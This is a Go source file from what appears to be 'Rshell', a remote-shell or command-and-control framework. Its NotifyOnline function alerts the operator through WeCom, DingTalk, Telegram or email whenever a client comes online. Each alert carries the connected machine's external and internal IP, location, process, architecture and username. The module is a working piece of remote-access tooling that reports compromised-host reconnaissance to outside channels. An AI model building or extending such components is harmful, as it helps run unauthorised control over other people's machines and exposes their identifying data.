package webhooks

import (
	"Rshell/pkg/database"
	"Rshell/pkg/logger"
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/smtp"
	"net/url"
	"time"
)

// Webhook configurations
type WecomConfig struct {
	URL     string `json:"url"`
	Enabled bool   `json:"enabled"`
}
type DingtalkConfig struct {
	Webhook string `json:"webhook"`
	Secret  string `json:"secret"`
	Enabled bool   `json:"enabled"`
}
type TelegramConfig struct {
	Token   string `json:"token"`
	ChatId  string `json:"chat_id"`
	Enabled bool   `json:"enabled"`
}
type EmailConfig struct {
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
	To       string `json:"to"`
	Enabled  bool   `json:"enabled"`
}

// Send functions
func SendWecom(Client database.Clients, WxKey string) error {
	content := fmt.Sprintf("External_IP:%s\nLocaltion:%s\nProcess:%s\nArch:%s\nInternal_IP:%s\nUser:%s\n", Client.ExternalIP, Client.Address, Client.Process, Client.Arch, Client.InternalIP, Client.Username)
	webhookURL := fmt.Sprintf("%s?key=%s", "https://qyapi.weixin.qq.com/cgi-bin/webhook/send", WxKey)
	msg := weComTextMsg{
		MsgType: "text",
		Text:    weComContent{Content: content},
	}
	body, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("json marshal error: %w", err)
	}
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(webhookURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		logger.Error(err.Error())
		return fmt.Errorf("http post error: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		logger.Error(fmt.Sprintf("wechat webhook response status: %s", resp.Status))
		return fmt.Errorf("wechat webhook response status: %s", resp.Status)
	}
	return nil
}

type weComTextMsg struct {
	MsgType string       `json:"msgtype"`
	Text    weComContent `json:"text"`
}
type weComContent struct {
	Content             string   `json:"content"`
	MentionedList       []string `json:"mentioned_list,omitempty"`
	MentionedMobileList []string `json:"mentioned_mobile_list,omitempty"`
}

func SendDingtalk(Client database.Clients, webhook string, secret string) error {
	content := fmt.Sprintf("✨ Rshell 客户端上线通知 ✨\n\n- External_IP: %s\n- Location: %s\n- Process: %s\n- Arch: %s\n- Internal_IP: %s\n- User: %s\n", Client.ExternalIP, Client.Address, Client.Process, Client.Arch, Client.InternalIP, Client.Username)

	timestamp := time.Now().UnixNano() / 1e6
	var finalUrl string
	if secret != "" {
		strToSign := fmt.Sprintf("%d\n%s", timestamp, secret)
		mac := hmac.New(sha256.New, []byte(secret))
		mac.Write([]byte(strToSign))
		sign := base64.StdEncoding.EncodeToString(mac.Sum(nil))
		finalUrl = fmt.Sprintf("%s&timestamp=%d&sign=%s", webhook, timestamp, url.QueryEscape(sign))
	} else {
		finalUrl = webhook
	}

	payload := map[string]interface{}{
		"msgtype": "text",
		"text":    map[string]string{"content": content},
	}
	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(finalUrl, "application/json", bytes.NewBuffer(body))
	if err != nil {
		logger.Error("SendDingtalk: " + err.Error())
		return err
	}
	defer resp.Body.Close()
	return nil
}

func SendTelegram(Client database.Clients, token string, chatID string) error {
	content := fmt.Sprintf("🤖 Rshell 客户端上线通知\n\n🌍 External IP: %s\n📍 Location: %s\n⚙️ Process: %s\n💻 Arch: %s\n🔌 Internal IP: %s\n👤 User: %s", Client.ExternalIP, Client.Address, Client.Process, Client.Arch, Client.InternalIP, Client.Username)

	webhookURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	payload := map[string]interface{}{
		"chat_id": chatID,
		"text":    content,
	}
	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(webhookURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		logger.Error("SendTelegram: " + err.Error())
		return err
	}
	defer resp.Body.Close()
	return nil
}

func SendEmail(Client database.Clients, config EmailConfig) error {
	content := fmt.Sprintf("Rshell 客户端上线通知\n\nExternal_IP: %s\nLocation: %s\nProcess: %s\nArch: %s\nInternal_IP: %s\nUser: %s", Client.ExternalIP, Client.Address, Client.Process, Client.Arch, Client.InternalIP, Client.Username)

	auth := smtp.PlainAuth("", config.Username, config.Password, config.Host)
	msg := []byte("From: " + config.Username + "\r\n" +
		"To: " + config.To + "\r\n" +
		"Subject: Rshell 客户端上线\r\n" +
		"Content-Type: text/plain; charset=UTF-8\r\n" +
		"\r\n" +
		content + "\r\n")

	err := smtp.SendMail(fmt.Sprintf("%s:%d", config.Host, config.Port), auth, config.Username, []string{config.To}, msg)
	if err != nil {
		logger.Error("SendEmail: " + err.Error())
		return err
	}
	return nil
}

func NotifyOnline(client database.Clients) {
	var settings []database.Settings
	err := database.Engine.In("name", []string{"wecom", "dingtalk", "telegram", "email"}).Find(&settings)
	if err != nil {
		logger.Error("Failed to fetch notification settings: " + err.Error())
		return
	}

	for _, setting := range settings {
		if setting.Value == "" || setting.Value == "{}" {
			continue
		}
		switch setting.Name {
		case "wecom":
			var wecom WecomConfig
			if err := json.Unmarshal([]byte(setting.Value), &wecom); err != nil {
				SendWecom(client, setting.Value)
			} else {
				if wecom.Enabled && wecom.URL != "" {
					SendWecom(client, wecom.URL)
				}
			}
		case "dingtalk":
			var ding DingtalkConfig
			if err := json.Unmarshal([]byte(setting.Value), &ding); err == nil && ding.Enabled && ding.Webhook != "" {
				SendDingtalk(client, ding.Webhook, ding.Secret)
			}
		case "telegram":
			var tg TelegramConfig
			if err := json.Unmarshal([]byte(setting.Value), &tg); err == nil && tg.Enabled && tg.Token != "" && tg.ChatId != "" {
				SendTelegram(client, tg.Token, tg.ChatId)
			}
		case "email":
			var email EmailConfig
			if err := json.Unmarshal([]byte(setting.Value), &email); err == nil && email.Enabled && email.Host != "" {
				SendEmail(client, email)
			}
		}
	}
}
